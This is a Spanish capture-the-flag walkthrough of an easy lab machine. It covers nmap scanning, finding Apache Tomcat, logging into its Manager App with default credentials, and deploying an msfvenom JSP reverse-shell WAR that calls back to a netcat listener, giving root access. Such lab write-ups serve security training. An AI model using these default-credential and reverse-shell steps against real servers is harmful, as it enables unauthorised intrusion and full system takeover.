---
description: >-
  ✍️ Autor: El Pingüino de Mario🔍 Dificultad: Fácil  📅 Fecha de creación:
  02/04/2024
---

# -Pn

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 8080** perteneciente al **servicio HTTP** está abierto por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p8080 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (882).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web sea un Apache Tomcat.

<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

Vamos a **Manager App** y nos pide unas credenciales. A través de esta [página ](https://book.hacktricks.xyz/es/network-services-pentesting/pentesting-web/tomcat)nos indica las credenciales por defecto y cómo vulnerar esta versión. Las credenciales fueron **tomcat:s3cr3t.**

<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Subimos una Reverse Shell.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o reverse.war
```

<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha.

```bash
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (887).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

y  somos **root.**
